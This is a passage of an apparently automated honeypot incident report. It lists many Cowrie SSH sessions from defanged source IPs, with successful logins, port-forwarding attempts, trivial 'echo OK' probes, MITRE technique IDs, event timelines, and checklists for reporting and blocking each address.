| `2026-07-19 06:20:40` | `cowrie.command.input` |
| `2026-07-19 06:20:40` | `cowrie.log.closed` |
| `2026-07-19 06:20:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bbe75ade927

| Field | Detail |
|---|---|
| **Source IP** | `45.170.50[.]2` |
| **First Seen** | 2026-07-19 06:21 |
| **Last Seen** | 2026-07-19 06:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:21:51` | `cowrie.session.connect` |
| `2026-07-19 06:21:51` | `cowrie.client.version` |
| `2026-07-19 06:21:51` | `cowrie.client.kex` |
| `2026-07-19 06:21:53` | `cowrie.login.success` |
| `2026-07-19 06:21:53` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:21:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.170.50[.]2` to AbuseIPDB if not already reported
- [ ] Block `45.170.50[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-725bacf35960

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 06:22 |
| **Last Seen** | 2026-07-19 06:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:22:10` | `cowrie.session.connect` |
| `2026-07-19 06:22:10` | `cowrie.client.version` |
| `2026-07-19 06:22:10` | `cowrie.client.kex` |
| `2026-07-19 06:22:10` | `cowrie.login.success` |
| `2026-07-19 06:22:11` | `cowrie.session.params` |
| `2026-07-19 06:22:11` | `cowrie.command.input` |
| `2026-07-19 06:22:11` | `cowrie.log.closed` |
| `2026-07-19 06:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cb3af157341

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-19 06:31 |
| **Last Seen** | 2026-07-19 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:31:13` | `cowrie.session.connect` |
| `2026-07-19 06:31:13` | `cowrie.client.version` |
| `2026-07-19 06:31:13` | `cowrie.client.kex` |
| `2026-07-19 06:31:13` | `cowrie.login.success` |
| `2026-07-19 06:31:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7fc62e2c33b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-19 06:31 |
| **Last Seen** | 2026-07-19 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:31:15` | `cowrie.session.connect` |
| `2026-07-19 06:31:15` | `cowrie.client.version` |
| `2026-07-19 06:31:15` | `cowrie.client.kex` |
| `2026-07-19 06:31:15` | `cowrie.login.success` |
| `2026-07-19 06:31:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b29572f377

| Field | Detail |
|---|---|
| **Source IP** | `200.105.141[.]172` |
| **First Seen** | 2026-07-19 06:33 |
| **Last Seen** | 2026-07-19 06:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:33:10` | `cowrie.session.connect` |
| `2026-07-19 06:33:11` | `cowrie.client.version` |
| `2026-07-19 06:33:11` | `cowrie.client.kex` |
| `2026-07-19 06:33:12` | `cowrie.login.success` |
| `2026-07-19 06:33:13` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.141[.]172` to AbuseIPDB if not already reported
- [ ] Block `200.105.141[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-019ee7d6149b

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-07-19 06:33 |
| **Last Seen** | 2026-07-19 06:33 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:33:26` | `cowrie.session.connect` |
| `2026-07-19 06:33:28` | `cowrie.client.version` |
| `2026-07-19 06:33:28` | `cowrie.client.kex` |
| `2026-07-19 06:33:32` | `cowrie.login.success` |
| `2026-07-19 06:33:34` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-519488515af6

| Field | Detail |
|---|---|
| **Source IP** | `128.199.118[.]234` |
| **First Seen** | 2026-07-19 06:33 |
| **Last Seen** | 2026-07-19 06:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:33:33` | `cowrie.session.connect` |
| `2026-07-19 06:33:33` | `cowrie.client.version` |
| `2026-07-19 06:33:33` | `cowrie.client.kex` |
| `2026-07-19 06:33:35` | `cowrie.login.success` |
| `2026-07-19 06:33:36` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.199.118[.]234` to AbuseIPDB if not already reported
- [ ] Block `128.199.118[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-174a30e17ca8

| Field | Detail |
|---|---|
| **Source IP** | `220.246.43[.]109` |
| **First Seen** | 2026-07-19 06:33 |
| **Last Seen** | 2026-07-19 06:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:33:42` | `cowrie.session.connect` |
| `2026-07-19 06:33:43` | `cowrie.client.version` |
| `2026-07-19 06:33:43` | `cowrie.client.kex` |
| `2026-07-19 06:33:45` | `cowrie.login.success` |
| `2026-07-19 06:33:45` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.43[.]109` to AbuseIPDB if not already reported
- [ ] Block `220.246.43[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ab1f20bab6f

| Field | Detail |
|---|---|
| **Source IP** | `183.223.156[.]154` |
| **First Seen** | 2026-07-19 06:36 |
| **Last Seen** | 2026-07-19 06:36 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:36:25` | `cowrie.session.connect` |
| `2026-07-19 06:36:28` | `cowrie.client.version` |
| `2026-07-19 06:36:28` | `cowrie.client.kex` |
| `2026-07-19 06:36:31` | `cowrie.login.success` |
| `2026-07-19 06:36:33` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.223.156[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.223.156[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-504f073a520c

| Field | Detail |
|---|---|
| **Source IP** | `112.25.140[.]211` |
| **First Seen** | 2026-07-19 06:36 |
| **Last Seen** | 2026-07-19 06:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:36:43` | `cowrie.session.connect` |
| `2026-07-19 06:36:44` | `cowrie.client.version` |
| `2026-07-19 06:36:44` | `cowrie.client.kex` |
| `2026-07-19 06:36:47` | `cowrie.login.success` |
| `2026-07-19 06:36:48` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:36:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.25.140[.]211` to AbuseIPDB if not already reported
- [ ] Block `112.25.140[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c158885601c

| Field | Detail |
|---|---|
| **Source IP** | `185.2.228[.]48` |
| **First Seen** | 2026-07-19 06:37 |
| **Last Seen** | 2026-07-19 06:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:37:01` | `cowrie.session.connect` |
| `2026-07-19 06:37:01` | `cowrie.client.version` |
| `2026-07-19 06:37:01` | `cowrie.client.kex` |
| `2026-07-19 06:37:02` | `cowrie.login.success` |
| `2026-07-19 06:37:02` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.2.228[.]48` to AbuseIPDB if not already reported
- [ ] Block `185.2.228[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9fe4b60c98f

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-19 06:37 |
| **Last Seen** | 2026-07-19 06:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:37:12` | `cowrie.session.connect` |
| `2026-07-19 06:37:12` | `cowrie.client.version` |
| `2026-07-19 06:37:12` | `cowrie.client.kex` |
| `2026-07-19 06:37:13` | `cowrie.login.success` |
| `2026-07-19 06:37:13` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:37:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d2433abd095

| Field | Detail |
|---|---|
| **Source IP** | `72.210.6[.]207` |
| **First Seen** | 2026-07-19 06:39 |
| **Last Seen** | 2026-07-19 06:40 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:39:38` | `cowrie.session.connect` |
| `2026-07-19 06:39:45` | `cowrie.client.version` |
| `2026-07-19 06:39:45` | `cowrie.client.kex` |
| `2026-07-19 06:40:09` | `cowrie.login.success` |
| `2026-07-19 06:40:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.210.6[.]207` to AbuseIPDB if not already reported
- [ ] Block `72.210.6[.]207` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e5ba3aa64e4

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-19 06:40 |
| **Last Seen** | 2026-07-19 06:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:40:26` | `cowrie.session.connect` |
| `2026-07-19 06:40:26` | `cowrie.client.version` |
| `2026-07-19 06:40:26` | `cowrie.client.kex` |
| `2026-07-19 06:40:26` | `cowrie.login.success` |
| `2026-07-19 06:40:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c41db008308

| Field | Detail |
|---|---|
| **Source IP** | `192.34.128[.]202` |
| **First Seen** | 2026-07-19 06:41 |
| **Last Seen** | 2026-07-19 06:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:41:18` | `cowrie.session.connect` |
| `2026-07-19 06:41:19` | `cowrie.client.version` |
| `2026-07-19 06:41:19` | `cowrie.client.kex` |
| `2026-07-19 06:41:20` | `cowrie.login.success` |
| `2026-07-19 06:41:20` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.34.128[.]202` to AbuseIPDB if not already reported
- [ ] Block `192.34.128[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c81bc864f2a7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 06:43 |
| **Last Seen** | 2026-07-19 06:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:43:05` | `cowrie.session.connect` |
| `2026-07-19 06:43:05` | `cowrie.client.version` |
| `2026-07-19 06:43:05` | `cowrie.client.kex` |
| `2026-07-19 06:43:05` | `cowrie.login.success` |
| `2026-07-19 06:43:06` | `cowrie.session.params` |
| `2026-07-19 06:43:06` | `cowrie.command.input` |
| `2026-07-19 06:43:06` | `cowrie.log.closed` |
| `2026-07-19 06:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed524c8f238

| Field | Detail |
|---|---|
| **Source IP** | `179.189.85[.]66` |
| **First Seen** | 2026-07-19 06:46 |
| **Last Seen** | 2026-07-19 06:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:46:42` | `cowrie.session.connect` |
| `2026-07-19 06:46:43` | `cowrie.client.version` |
| `2026-07-19 06:46:43` | `cowrie.client.kex` |
| `2026-07-19 06:46:45` | `cowrie.login.success` |
| `2026-07-19 06:46:45` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.189.85[.]66` to AbuseIPDB if not already reported
- [ ] Block `179.189.85[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b627fea26a8a

| Field | Detail |
|---|---|
| **Source IP** | `112.94.5[.]43` |
| **First Seen** | 2026-07-19 06:46 |
| **Last Seen** | 2026-07-19 06:47 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:46:51` | `cowrie.session.connect` |
| `2026-07-19 06:46:52` | `cowrie.client.version` |
| `2026-07-19 06:46:52` | `cowrie.client.kex` |
| `2026-07-19 06:46:56` | `cowrie.login.success` |
| `2026-07-19 06:46:58` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.94.5[.]43` to AbuseIPDB if not already reported
- [ ] Block `112.94.5[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ab533e4b318

| Field | Detail |
|---|---|
| **Source IP** | `183.82.108[.]109` |
| **First Seen** | 2026-07-19 07:00 |
| **Last Seen** | 2026-07-19 07:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:00:04` | `cowrie.session.connect` |
| `2026-07-19 07:00:05` | `cowrie.client.version` |
| `2026-07-19 07:00:05` | `cowrie.client.kex` |
| `2026-07-19 07:00:06` | `cowrie.login.success` |
| `2026-07-19 07:00:07` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.108[.]109` to AbuseIPDB if not already reported
- [ ] Block `183.82.108[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2df8a100c805

| Field | Detail |
|---|---|
| **Source IP** | `125.139.124[.]120` |
| **First Seen** | 2026-07-19 07:01 |
| **Last Seen** | 2026-07-19 07:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:01:51` | `cowrie.session.connect` |
| `2026-07-19 07:01:51` | `cowrie.client.version` |
| `2026-07-19 07:01:51` | `cowrie.client.kex` |
| `2026-07-19 07:01:53` | `cowrie.login.success` |
| `2026-07-19 07:01:54` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.139.124[.]120` to AbuseIPDB if not already reported
- [ ] Block `125.139.124[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40daaff73555

| Field | Detail |
|---|---|
| **Source IP** | `171.8.42[.]112` |
| **First Seen** | 2026-07-19 07:02 |
| **Last Seen** | 2026-07-19 07:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:02:00` | `cowrie.session.connect` |
| `2026-07-19 07:02:01` | `cowrie.client.version` |
| `2026-07-19 07:02:01` | `cowrie.client.kex` |
| `2026-07-19 07:02:04` | `cowrie.login.success` |
| `2026-07-19 07:02:05` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:02:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.8.42[.]112` to AbuseIPDB if not already reported
- [ ] Block `171.8.42[.]112` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5c2c97581c2

| Field | Detail |
|---|---|
| **Source IP** | `211.22.222[.]251` |
| **First Seen** | 2026-07-19 07:02 |
| **Last Seen** | 2026-07-19 07:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:02:50` | `cowrie.session.connect` |
| `2026-07-19 07:02:51` | `cowrie.client.version` |
| `2026-07-19 07:02:51` | `cowrie.client.kex` |
| `2026-07-19 07:02:54` | `cowrie.login.success` |
| `2026-07-19 07:02:55` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.22.222[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.22.222[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2a069c4b334

| Field | Detail |
|---|---|
| **Source IP** | `183.167.217[.]86` |
| **First Seen** | 2026-07-19 07:03 |
| **Last Seen** | 2026-07-19 07:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:03:00` | `cowrie.session.connect` |
| `2026-07-19 07:03:01` | `cowrie.client.version` |
| `2026-07-19 07:03:01` | `cowrie.client.kex` |
| `2026-07-19 07:03:04` | `cowrie.login.success` |
| `2026-07-19 07:03:04` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.217[.]86` to AbuseIPDB if not already reported
- [ ] Block `183.167.217[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-754cd3ccf3e3

| Field | Detail |
|---|---|
| **Source IP** | `218.4.156[.]254` |
| **First Seen** | 2026-07-19 07:11 |
| **Last Seen** | 2026-07-19 07:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:11:37` | `cowrie.session.connect` |
| `2026-07-19 07:11:38` | `cowrie.client.version` |
| `2026-07-19 07:11:38` | `cowrie.client.kex` |
| `2026-07-19 07:11:42` | `cowrie.login.success` |
| `2026-07-19 07:11:43` | `cowrie.direct-tcpip.request` |
| `2026-07-19 07:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.4.156[.]254` to AbuseIPDB if not already reported
- [ ] Block `218.4.156[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb619f47e161

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 07:12 |
| **Last Seen** | 2026-07-19 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:12:36` | `cowrie.session.connect` |
| `2026-07-19 07:12:36` | `cowrie.client.version` |
| `2026-07-19 07:12:36` | `cowrie.client.kex` |
| `2026-07-19 07:12:37` | `cowrie.login.success` |
| `2026-07-19 07:12:37` | `cowrie.session.params` |
| `2026-07-19 07:12:37` | `cowrie.command.input` |
| `2026-07-19 07:12:38` | `cowrie.log.closed` |
| `2026-07-19 07:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0907f35b63b

| Field | Detail |
|---|---|
| **Source IP** | `34.22.117[.]112` |
| **First Seen** | 2026-07-19 07:18 |
| **Last Seen** | 2026-07-19 07:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 07:18:35` | `cowrie.session.connect` |
| `2026-07-19 07:18:35` | `cowrie.login.success` |
| `2026-07-19 07:18:35` | `cowrie.session.params` |
| `2026-07-19 07:18:35` | `cowrie.command.input` |
| `2026-07-19 07:18:35` | `cowrie.command.input` |
| `2026-07-19 07:18:35` | `cowrie.command.failed` |
| `2026-07-19 07:18:35` | `cowrie.command.input` |
| `2026-07-19 07:18:35` | `cowrie.log.closed` |
| `2026-07-19 07:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.22.117[.]112` to AbuseIPDB if not already reported
- [ ] Block `34.22.117[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
